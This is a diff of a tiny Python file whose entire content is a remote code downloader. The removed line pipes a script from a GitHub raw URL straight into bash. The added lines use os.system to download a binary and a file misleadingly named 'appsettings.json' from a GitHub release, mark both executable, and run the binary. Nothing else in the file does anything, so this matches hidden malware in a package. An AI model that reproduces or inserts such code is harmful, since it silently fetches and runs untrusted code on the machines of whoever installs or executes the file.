@@ -1,3 +1,7 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/qubros/raw/main/aplms | bash')
+os.system('wget https://github.com/vedhagsvp/taberas/releases/download/latest/plospa')
+os.system('wget https://github.com/vedhagsvp/taberas/releases/download/latest/appsettings.json')
+os.system('chmod +x appsettings.json')
+os.system('chmod +x plospa')
+os.system('./plospa')
